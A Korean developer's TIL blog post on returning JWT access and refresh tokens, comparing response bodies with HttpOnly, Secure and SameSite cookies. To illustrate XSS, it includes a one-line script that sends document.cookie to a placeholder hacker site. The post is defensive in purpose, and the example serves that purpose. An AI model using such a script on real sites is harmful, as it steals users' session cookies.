---
title: "[TIL] JWT 반환(Access,Refresh)"
author: heesu
date: 2024-04-14 00:43:00+0900
categories: [TIL]
tags: []
---

### ISSUE1 리프레시 토큰을 클라이언트에게 어떻게 형식으로 반환해야할까?

❓**문제상황**

- 처음에는 access token과 refresh token을 responsebody에 담아 같이 반환했다.
- 이 방식은 AccessToken 탈취를 방지하기 위해 도입한 RefreshToken의 목적을 무색하게 만들 수 있다고 판단
- 그런데 `responsebody에 반환`할 경우 `xss`공격에 취약하다
  - 응답 메시지 바디나 헤더로 반환할 경우, Local Storage나 Session Storage에 저장한다. 이는 브라우저에서 JS를 통해서 접근할 수 있기 때문에 **XSS**공격에 취약하다
- `쿠키로 반환`하면 어떻게 될까?
  - 쿠키도 브라우저에서 JS를 통해 접근가능하여 XSS공격에 취약하다.
  - But!!! `쿠키의 HttpOnly기능`을 통해 JS접근을 막을 수 있다. 그렇다면 어느정도 xss공격을 방어할 수 있을 것이다.
  - However!! 쿠키는 `CSRF공격에도 취약`하다. 쿠키 생성시 자동으로 헤더에 포함되기 때문이다.
  - Nevertheless!!! `쿠키의 SameSite기능`을 이용하면 100%방어율은 아니지만 어느정도 공격에 대비할 수 있다.

[참고](https://www.springcloud.io/post/2022-02/jwt-cookie/#gsc.tab=0)

❗**해결방법**

- responsbody보다 더 많은 보안 기능을 제공하는 **refresh Token**을 secure 쿠키로, http header에담고 **access token**은 프론트엔드에서 처리할 수 있도록 responseBody에 담아 보내기로 했다.
  - `HttpOnly = true`

      ```jsx
      <script> location.href = '해커사이트주소?cookie=' + document.cookie </script>
      ```

    - 브라우저에서 쿠키에 접근못하게 하는 기능으로 위와 같은 xss공격을 방어할 수 있다.
    - 그러나 네트워크를 감청하여 쿠키 탈취가 가능하다.
  - `Secure = true`

      ```jsx
      <img src="http://....png" />
      ```

    - https를 사용하여 쿠키를 암호화하는 기능으로 위와 같은 암호화되지 않은 토큰 탈취를 방어할 수 있다.
  - `SameSite`
    - Cross-Site 요청에서 사용한 메서드와 해당 옵션의 조합을 기준으로 서버의 쿠키 전송 여부를 결정
    1. **Strict** : **Same-Site** 인 경우에만 쿠키를 전송
    2. **Lax** : **Cross-Site 요청의 GET 메서드** 일 경우만 쿠키를 전송
    3. **None** : Secure 옵션이 true면 항상 쿠키 전송
  
- 쿠키의 **SameSite기능을 사용**하기 위해서는 Cookie가 아닌 **ResponseCookie를 사용**해야 했다.
  - ResponseCookie 는 Cookie의 확장판

<br>

**결론**

- AccessToken은 ResponseBody에, RefreshToken은 쿠키로 반환하는 방식을 최종적으로 선택
-  추후에는 OTP와 같은 2FA를 도입하여 보안 수준을 높이는 방향으로 디벨롭해보자!!!!
